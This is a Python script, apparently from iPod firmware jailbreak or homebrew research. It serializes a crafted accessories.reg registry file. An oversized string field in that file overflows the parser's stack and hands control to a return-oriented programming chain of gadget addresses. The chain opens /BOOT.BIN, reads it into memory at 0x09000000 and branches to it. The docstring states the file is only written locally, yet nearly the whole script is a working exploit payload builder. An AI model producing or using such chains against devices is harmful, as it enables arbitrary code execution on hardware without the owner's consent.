#!/usr/bin/env python3
"""Serialize the current static accessories.reg ROP candidate for review.

This only writes a local analysis artifact next to this script. It does not
contact or modify an iPod.
"""

from __future__ import annotations

import hashlib
import struct
from pathlib import Path


OUT = Path(__file__).resolve().parent / "candidate_accessories_reg_unexecuted.bin"
FIELD_LEN = 0x284


def u32(value: int) -> bytes:
    return struct.pack("<I", value)


def put_word(data: bytearray, offset: int, value: int) -> None:
    if offset < 0 or offset + 4 > len(data):
        raise ValueError(f"word outside 0x44 field: offset={offset:#x}")
    data[offset : offset + 4] = u32(value)


field = bytearray(FIELD_LEN)

# Parser object/cleanup fields. Offsets are relative to the 0x44 data start.
put_word(field, 0x10C, 0x085354D8)  # valid string VTable
put_word(field, 0x110, 0)  # initially empty string buffer
put_word(field, 0x114, 1)  # leave the token loop after the read
put_word(field, 0x120, 0x084F59E0)  # static null sentinel for stream close
put_word(field, 0x124, 0x09000000)  # cleanup byte is overwritten by loader read

# The string object is at P=S+0x40 and its source is P+0x80.
field[0xBC : 0xBC + len(b"/BOOT.BIN\0")] = b"/BOOT.BIN\0"

# The saved LR and stack words, expressed as offsets from the 0x44 data start.
rop = {
    0x138: 0x08007107,  # parser-return gadget: pop {r0-r4,pc}
    0x150: 0x0800396D,  # mov r0,sp; pop {r2-r6,pc}
    0x158: 0x0805B093,  # writer Thumb entry (r3)
    0x160: 0x6F6C746F,  # r5 for the writer stores
    0x168: 0x08005CC3,  # subs r0,#0xe0
    0x170: 0x6F6C746F,  # preserve r5 across pop
    0x178: 0x080066B5,  # subs r0,#0x20; pop {r4,pc}
    0x180: 0x0809CF57,  # subs r0,#0x18
    0x184: 0x00000061,  # r4 for final writer byte
    0x188: 0x08030CBD,  # call/pop trampoline entry
    0x198: 0x08198771,  # string constructor
    0x1A8: 0x0800396D,  # second stack-relative stage
    0x1C0: 0x08262D53,  # subs r0,#0x8c
    0x1D0: 0x08262D53,  # subs r0,#0x8c
    0x1E0: 0x081DF4C1,  # subs r0,#0x28; pop {r1-r5,pc}
    0x1E8: 0x00000000,  # r2=open mode 0
    0x1EC: 0x0818A911,  # mov r1,r0; bx lr
    0x1F8: 0x080F8A33,  # subs r0,#0x18; pop {pc}
    0x1FC: 0x080F8A33,  # second subs r0,#0x18; pop {pc}
    0x200: 0x08030CBD,  # helper return trampoline
    0x204: 0x082721F1,  # open wrapper Thumb pointer (r3)
    0x210: 0x08030CBD,  # trampoline call open
    0x220: 0x0800396D,  # third stack-relative stage, SP=S+0x228
    0x238: 0x08005CC3,  # first subs r0,#0xe0
    0x248: 0x08005CC3,  # second subs r0,#0xe0
    0x258: 0x081DF4C1,  # subs r0,#0x28; pop read args
    0x25C: 0x00010F80,  # r1: loader file size, 69,504 bytes
    0x260: 0x09000000,  # r2: loader destination
    0x264: 0x08268C3B,  # r3: read dispatcher Thumb pointer
    0x270: 0x08030CBD,  # trampoline call read
    0x274: 0x09000000,  # r3 after read: ARM loader entry
    0x280: 0x08030CBD,  # final BLX r3 through trampoline
}

# Fill all remaining stack-pop words with zero. Required words below replace
# these in place; unspecified words are dead registers or harmless fillers.
for offset in range(0x128, FIELD_LEN - 3, 4):
    put_word(field, offset, 0)
for offset, value in rop.items():
    put_word(field, offset, value)

# Pre-parser saved r4-r7, followed by the LR consumed by the parser epilogue.
for offset in (0x128, 0x12C, 0x130, 0x134):
    put_word(field, offset, 0)
put_word(field, 0x138, rop[0x138])

# Guard the control-transfer words and the arguments whose locations follow
# from the original gadgets' exact pop counts.
expected_field_words = {
    0x138: 0x08007107,
    0x150: 0x0800396D,
    0x158: 0x0805B093,
    0x168: 0x08005CC3,
    0x178: 0x080066B5,
    0x180: 0x0809CF57,
    0x188: 0x08030CBD,
    0x198: 0x08198771,
    0x1A8: 0x0800396D,
    0x1C0: 0x08262D53,
    0x1D0: 0x08262D53,
    0x1E0: 0x081DF4C1,
    0x1E8: 0x00000000,
    0x1EC: 0x0818A911,
    0x1F8: 0x080F8A33,
    0x1FC: 0x080F8A33,
    0x200: 0x08030CBD,
    0x204: 0x082721F1,
    0x210: 0x08030CBD,
    0x220: 0x0800396D,
    0x238: 0x08005CC3,
    0x248: 0x08005CC3,
    0x258: 0x081DF4C1,
    0x25C: 0x00010F80,
    0x260: 0x09000000,
    0x264: 0x08268C3B,
    0x270: 0x08030CBD,
    0x274: 0x09000000,
    0x280: 0x08030CBD,
}
for offset, expected in expected_field_words.items():
    actual = struct.unpack_from("<I", field, offset)[0]
    if actual != expected:
        raise AssertionError(
            f"field word at {offset:#x}: got {actual:#010x}, expected {expected:#010x}"
        )

# Existing registry wire format: two nested containers, field 0x2b, the
# oversized 0x44 string, field 0x2d, and the two container-end markers.
body = bytearray()
for word in (
    0x40000029,
    0x4000002A,
    0x0000002B,
    0x00000004,
    0x00000003,
    0x8000002B,
    0x00000044,
    FIELD_LEN,
):
    body.extend(u32(word))
body.extend(field)
for word in (
    0x80000044,
    0x0000002D,
    0x00000004,
    0x691272BB,
    0x8000002D,
    0xC000002A,
    0xC0000029,
):
    body.extend(u32(word))

if len(body) != 0x2C0:
    raise AssertionError(f"unexpected file size: {len(body):#x}")
if body[0x20 + 0xBC : 0x20 + 0xC6] != b"/BOOT.BIN\0":
    raise AssertionError("embedded loader path moved")
if struct.unpack_from("<I", body, 0x1C)[0] != FIELD_LEN:
    raise AssertionError("0x44 length word mismatch")
if struct.unpack_from("<I", body, 0x20 + 0x280)[0] != 0x08030CBD:
    raise AssertionError("final controlled PC mismatch")

OUT.write_bytes(body)
print(f"wrote local candidate: {OUT}")
print(f"size: {len(body)} bytes (0x{len(body):x})")
print(f"sha256: {hashlib.sha256(body).hexdigest()}")
print("status: not executed and not written to a device")
